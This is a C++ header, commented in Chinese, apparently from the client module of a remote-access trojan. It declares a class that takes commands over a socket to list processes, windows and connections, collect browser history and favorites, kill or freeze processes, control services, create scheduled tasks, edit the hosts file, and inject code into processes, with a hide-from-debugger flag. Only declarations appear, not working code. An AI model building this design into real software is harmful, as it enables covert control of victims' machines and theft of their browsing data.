#pragma once
#include "Manager.h"
#include <Iphlpapi.h>     
#include <tlhelp32.h>     
#include <map>
#include <WINSOCK2.H>    

#pragma comment(lib, "Iphlpapi.lib")     
#pragma comment(lib, "WS2_32.lib")   

#include <taskschd.h>
#include <comutil.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

typedef std::map<DWORD, std::wstring*> PidandStitle; //进程ID与窗口名
#define MAKE_PAIR(_a,b,c) _a::value_type((b),(c))

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED	0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH  0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER	0x00000004

enum MACHINE
{

	COMMAND_MACHINE_PROCESS,
	COMMAND_MACHINE_WINDOWS,
	COMMAND_MACHINE_NETSTATE,
	COMMAND_MACHINE_SOFTWARE,
	COMMAND_MACHINE_HTML,
	COMMAND_MACHINE_FAVORITES,
	COMMAND_MACHINE_WIN32SERVICE,
	COMMAND_MACHINE_DRIVERSERVICE,
	COMMAND_MACHINE_TASK,
	COMMAND_MACHINE_HOSTS, //不能乱序号



	COMMAND_APPUNINSTALL,//卸载
	COMMAND_WINDOW_OPERATE,//窗口控制
	COMMAND_WINDOW_CLOSE,//关闭
	COMMAND_PROCESS_KILL,//结束进程
	COMMAND_PROCESS_KILLDEL,//结束进程----删除
	COMMAND_PROCESS_DEL,//强制删除 不需要结束进程
	COMMAND_PROCESS_FREEZING,//冻结	
	COMMAND_PROCESS_THAW,//解冻
	COMMAND_HOSTS_SET,//hosts

	COMMAND_SERVICE_LIST_WIN32,
	COMMAND_SERVICE_LIST_DRIVER,
	COMMAND_DELETESERVERICE,
	COMMAND_STARTSERVERICE,
	COMMAND_STOPSERVERICE,
	COMMAND_PAUSESERVERICE,
	COMMAND_CONTINUESERVERICE,


	COMMAND_TASKCREAT,
	COMMAND_TASKDEL,
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_INJECT,

	TOKEN_MACHINE_PROCESS,
	TOKEN_MACHINE_WINDOWS,
	TOKEN_MACHINE_NETSTATE,
	TOKEN_MACHINE_SOFTWARE,
	TOKEN_MACHINE_HTML,
	TOKEN_MACHINE_FAVORITES,
	TOKEN_MACHINE_WIN32SERVICE,
	TOKEN_MACHINE_DRIVERSERVICE,
	TOKEN_MACHINE_HOSTS,
	TOKEN_MACHINE_SERVICE_LIST,
	TOKEN_MACHINE_TASKLIST,

	TOKEN_MACHINE_MSG,
};









class CMachineManager : public CManager
{
public:
	BOOL m_buser;
	CMachineManager(ISocketBase* pClient);
	virtual ~CMachineManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	static BOOL DebugPrivilege(const TCHAR* PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
	HWND GetHwndByPid(DWORD dwProcessID);
	bool Is64BitOS();
	bool Is64BitPorcess(DWORD dwProcessID);
	TCHAR* ProcessPidToName(HANDLE hProcessSnap, DWORD ProcessId, TCHAR* ProcessName);
	wchar_t* char2wchar_t(char* cstr);
	BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
	LPBYTE	lpFUBuffer ;
	DWORD	dwFUOffset; // 位移指针

	void DeleteService(LPBYTE lpBuffer, UINT nSize);
	void MyControlService(LPBYTE lpBuffer, UINT nType);


	void SendProcessList();
	LPBYTE getProcessList();	//进程

	void SendWindowsList();
	LPBYTE getWindowsList();	//窗口

	void SendNetStateList();
	LPBYTE getNetStateList();

	void SendSoftWareList();
	LPBYTE getSoftWareList();	//软件列表

	void SendIEHistoryList();
	LPBYTE getIEHistoryList(); //html浏览记录

	void SendFavoritesUrlList();
	void FindFavoritesUrl(TCHAR* searchfilename);
	LPBYTE getFavoritesUrlList(); //收藏夹

	void SendServicesList(DWORD dwScType = SERVICE_WIN32);
	LPBYTE getServiceList(DWORD dwScType);
	DWORD	 dwServiceType;

	PBYTE GetTaskAll(ITaskFolder* pFolder);							//获取目录下的所有任务
	PBYTE GetFolderAll(ITaskFolder* pFolder);							//获取目录下的子目录
	PBYTE GetRoot();																//获取根目录下的子文件夹

	BOOL CreateTask(LPBYTE lpBuffer);							//创建计划任务
	BOOL RunOrStopTask(LPBYTE lpBuffer, BOOL Action);  //执行或停止
	BOOL DelTask(LPBYTE lpBuffer);								//删除计划任务
	BOOL GetProgramPath(ITaskDefinition* iDefinition, BSTR* exepath);
	void SaveData(BSTR taskname, BSTR path, BSTR exepath, TCHAR* status, DATE LastTime, DATE NextTime);  //保存数据到缓冲区
	ITaskService* pService;				//连接计划任务的
	PBYTE lpList;								//发送任务计划的数据
	DWORD offset;								//偏移
	DWORD nBufferSize;						//内存大小

	void SendHostsList();

	void injectprocess(DWORD mode, DWORD ExeIsx86, DWORD dwProcessID,byte* data, DWORD datasize,TCHAR* path);

	void SendError(TCHAR* Terror);
};




struct  WINDOWSINFO
{
	TCHAR strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};


struct  Browsinghistory
{
	TCHAR strTime[100];
	TCHAR strTitle[1024];
	TCHAR strUrl[1024];

};


typedef struct
{
	DWORD   dwState;          // 连接状态     
	DWORD   dwLocalAddr;      // 本地地址     
	DWORD   dwLocalPort;      // 本地端口     
	DWORD   dwRemoteAddr;     // 远程地址     
	DWORD   dwRemotePort;     // 远程端口     
	DWORD   dwProcessId;      // 进程ID号     
} MIB_TCPEXROW, * PMIB_TCPEXROW;

typedef struct
{
	DWORD           dwNumEntries;
	MIB_TCPEXROW    table[ANY_SIZE];
} MIB_TCPEXTABLE, * PMIB_TCPEXTABLE;

typedef struct
{
	DWORD   dwLocalAddr;      // 本地地址     
	DWORD   dwLocalPort;      // 本地端口     
	DWORD   dwProcessId;      // 进程ID号     
} MIB_UDPEXROW, * PMIB_UDPEXROW;

typedef struct
{
	DWORD           dwNumEntries;
	MIB_UDPEXROW    table[ANY_SIZE];
} MIB_UDPEXTABLE, * PMIB_UDPEXTABLE;



typedef struct {
	DWORD dwState;      //连接状态
	DWORD dwLocalAddr;  //本地地址
	DWORD dwLocalPort;  //本地端口
	DWORD dwRemoteAddr; //远程地址
	DWORD dwRemotePort; //远程端口
	DWORD dwProcessId;  //进程标识
	DWORD Unknown;      //待定标识
}MIB_TCPEXROW_VISTA, * PMIB_TCPEXROW_VISTA;

typedef struct {
	DWORD dwNumEntries;
	MIB_TCPEXROW_VISTA table[ANY_SIZE];
}MIB_TCPEXTABLE_VISTA, * PMIB_TCPEXTABLE_VISTA;

typedef DWORD(WINAPI* _InternalGetTcpTable2)(
	PMIB_TCPEXTABLE_VISTA* pTcpTable_Vista,
	HANDLE heap,
	DWORD flags
	);


typedef DWORD(WINAPI* PFNInternalGetUdpTableWithOwnerPid)(
	PMIB_UDPEXTABLE* pUdpTable,
	HANDLE heap,
	DWORD flags
	);
// 扩展函数原型     
typedef DWORD(WINAPI* PFNAllocateAndGetTcpExTableFromStack)(
	PMIB_TCPEXTABLE* pTcpTable,
	BOOL bOrder,
	HANDLE heap,
	DWORD zero,
	DWORD flags
	);

typedef DWORD(WINAPI* PFNAllocateAndGetUdpExTableFromStack)(
	PMIB_UDPEXTABLE* pUdpTable,
	BOOL bOrder,
	HANDLE heap,
	DWORD zero,
	DWORD flags
	);



struct  InjectData
{
	DWORD ExeIsx86;
	DWORD mode;		//注入模式
	DWORD dwProcessID;//进程ID
	DWORD datasize;   //本地数据尺寸
	TCHAR strpath[1024]; //远程落地目录
};









